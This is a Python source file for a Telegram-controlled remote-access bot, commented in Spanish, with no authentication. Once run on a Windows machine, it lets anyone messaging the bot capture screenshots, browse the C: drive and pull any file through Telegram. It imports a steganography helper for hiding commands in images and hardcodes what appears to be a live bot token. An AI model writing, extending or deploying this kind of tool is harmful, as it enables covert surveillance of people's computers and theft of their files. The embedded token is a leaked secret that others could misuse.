import os
import telebot
from telebot import types
import pyautogui
from esteganografia import encode_command_in_image, decode_command_from_image

import sqlite3

# Conexión con nuestro BOT
TOKEN = '7350752233:AAFZTB3HMBbzbFMHh0-7q3XDbKnDb-ExWLg'
bot = telebot.TeleBot(TOKEN)

# Ruta para guardar capturas de pantalla (ruta relativa)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CAPTURES_DIR = os.path.join(BASE_DIR, 'Captures')
SCREENSHOT_PATH = os.path.join(CAPTURES_DIR, 'screenshot.png')
ENCODED_IMAGE_PATH = os.path.join(CAPTURES_DIR, 'encoded_screenshot.png')

# Definir directorio base como raíz del disco C
BASE_DIR = 'C:/'

# Diccionario para almacenar la última carpeta listada por cada usuario
user_directories = {}

# Función para crear el menú de botones
def get_main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn_help = types.KeyboardButton('/help')
    btn_screenshot = types.KeyboardButton('/screenshot')
    btn_send_files = types.KeyboardButton('/send_files')
    btn_list_files = types.KeyboardButton('/list_files')
    btn_list_directory = types.KeyboardButton('/list_directory')
    markup.add(btn_help, btn_screenshot, btn_send_files, btn_list_files, btn_list_directory)
    return markup

# Función para enviar instrucciones y mostrar botones
def send_instructions(chat_id):
    markup = get_main_menu()
    welcome_message = ("Hola! Soy tu bot. Puedes interactuar conmigo usando los siguientes comandos:\n"
                       "/help - Muestra este mensaje de ayuda\n"
                       "/screenshot - Toma y envía una captura de pantalla\n"
                       "/send_files - Envía un archivo\n"
                       "/list_files - Lista los directorios en la raíz del disco C\n"
                       "/list_directory - Lista el contenido de una carpeta específica")
    bot.send_message(chat_id, welcome_message, reply_markup=markup)

# Comando /start para dar la bienvenida y mostrar el menú inicial
@bot.message_handler(commands=['start'])
def send_welcome(message):
    send_instructions(message.chat.id)

# Comando /help para proporcionar ayuda
@bot.message_handler(commands=['help'])
def send_help(message):
    markup = get_main_menu()
    help_message = ('Puedes interactuar conmigo usando los siguientes comandos:\n'
                    '/start - Inicia el bot y muestra el menú\n'
                    '/help - Muestra este mensaje de ayuda\n'
                    '/screenshot - Toma y envía una captura de pantalla\n'
                    '/send_files - Envía un archivo\n'
                    '/list_files - Lista los directorios en la raíz del disco C\n'
                    '/list_directory - Lista el contenido de una carpeta específica')
    bot.send_message(message.chat.id, help_message, reply_markup=markup)

# Comando /screenshot para capturar y enviar una captura de pantalla
@bot.message_handler(commands=['screenshot'])
def send_screenshot(message):
    markup = get_main_menu()
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save('screenshot.png')
        with open('screenshot.png', 'rb') as file:
            bot.send_photo(message.chat.id, file, caption="Aquí tienes la captura de pantalla.", reply_markup=markup)
        os.remove('screenshot.png')
    except Exception as e:
        bot.send_message(message.chat.id, f"No se pudo tomar la captura de pantalla: {str(e)}", reply_markup=markup)

# Comando /send_files para solicitar nombre de archivo
@bot.message_handler(commands=['send_files'])
def request_file_name(message):
    msg = bot.send_message(message.chat.id, 'Por favor, ingresa la ruta completa del archivo que deseas enviar:')
    bot.register_next_step_handler(msg, send_file)

def send_file(message):
    markup = get_main_menu()
    file_path = message.text.strip()
    if os.path.exists(file_path):
        try:
            with open(file_path, 'rb') as file:
                bot.send_document(message.chat.id, file, caption=f"Aquí tienes el archivo {os.path.basename(file_path)}.", reply_markup=markup)
        except Exception as e:
            bot.send_message(message.chat.id, f"No se pudo enviar el archivo: {str(e)}", reply_markup=markup)
    else:
        bot.send_message(message.chat.id, f"El archivo '{file_path}' no existe o la ruta no es válida.", reply_markup=markup)

# Comando /list_files para listar los directorios en la raíz del disco C
@bot.message_handler(commands=['list_files'])
def list_files(message):
    markup = get_main_menu()
    try:
        root_dir = 'C:/'
        directories = [d for d in os.listdir(root_dir) if os.path.isdir(os.path.join(root_dir, d))]
        if directories:
            directory_list = "\n".join(directories)
            bot.send_message(message.chat.id, f"Directorios en la raíz de C:\n{directory_list}", reply_markup=markup)
        else:
            bot.send_message(message.chat.id, "No se encontraron directorios en la raíz de C:\n", reply_markup=markup)
    except Exception as e:
        bot.send_message(message.chat.id, f"No se pudo listar los directorios en la raíz de C:\n{str(e)}", reply_markup=markup)

# Comando /list_directory para listar el contenido de una carpeta específica
@bot.message_handler(commands=['list_directory'])
def request_directory(message):
    user_directories[message.chat.id] = BASE_DIR
    msg = bot.send_message(message.chat.id, f'Estás en {BASE_DIR}. Ingresa el nombre de la carpeta para listar su contenido:')
    bot.register_next_step_handler(msg, list_directory)

def list_directory(message):
    markup = get_main_menu()
    current_path = user_directories.get(message.chat.id, BASE_DIR)
    folder_name = message.text.strip()
    new_path = os.path.join(current_path, folder_name)
    
    try:
        if os.path.exists(new_path) and os.path.isdir(new_path):
            # Actualizar la última carpeta listada para este usuario
            user_directories[message.chat.id] = new_path
            
            files = os.listdir(new_path)
            if files:
                file_list = "\n".join(files)
                bot.send_message(message.chat.id, f"Contenido de la carpeta '{new_path}':\n{file_list}", reply_markup=markup)
            else:
                bot.send_message(message.chat.id, f"La carpeta '{new_path}' está vacía.", reply_markup=markup)
            
            # Preguntar si desea listar otra subcarpeta o regresar
            msg = bot.send_message(message.chat.id, f"¿Quieres listar otra subcarpeta de '{new_path}'? Si es así, ingresa el nombre de la subcarpeta. Para regresar al directorio anterior, ingresa '..'. Para enviar un archivo, escribe 'enviar [nombre del archivo]'.")
            bot.register_next_step_handler(msg, handle_next_step)
        else:
            bot.send_message(message.chat.id, f"La ruta '{new_path}' no es válida o no es un directorio.", reply_markup=markup)
    except Exception as e:
        bot.send_message(message.chat.id, f"No se pudo listar la carpeta '{new_path}': {str(e)}", reply_markup=markup)

def handle_next_step(message):
    current_path = user_directories.get(message.chat.id, BASE_DIR)
    input_text = message.text.strip()
    
    if input_text.lower().startswith('enviar '):
        # Extraer el nombre del archivo a enviar
        file_name = input_text[7:].strip()
        file_path = os.path.join(current_path, file_name)
        send_specific_file(message, file_path)
    elif input_text == '..':
        # Ir al directorio anterior
        new_path = os.path.dirname(current_path)
        user_directories[message.chat.id] = new_path
        list_directory(message)
    else:
        # Listar contenido de la subcarpeta especificada
        folder_name = input_text
        new_path = os.path.join(current_path, folder_name)
        list_directory(message)

def send_specific_file(message, file_path):
    markup = get_main_menu()
    if os.path.exists(file_path):
        try:
            with open(file_path, 'rb') as file:
                bot.send_document(message.chat.id, file, caption=f"Aquí tienes el archivo {os.path.basename(file_path)}.", reply_markup=markup)
        except Exception as e:
            bot.send_message(message.chat.id, f"No se pudo enviar el archivo: {str(e)}", reply_markup=markup)
    else:
        bot.send_message(message.chat.id, f"El archivo '{file_path}' no existe o la ruta no es válida.", reply_markup=markup)
        # Volver a preguntar la próxima acción en la carpeta actual
        msg = bot.send_message(message.chat.id, f"¿Quieres listar otra subcarpeta o enviar un archivo desde '{os.path.dirname(file_path)}'? Ingresa el nombre de la subcarpeta o 'enviar [nombre del archivo]'.")
        bot.register_next_step_handler(msg, handle_next_step)

# Manejador para cualquier otro mensaje recibido
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    send_instructions(message.chat.id)

if __name__ == "__main__":
    bot.polling(none_stop=True) 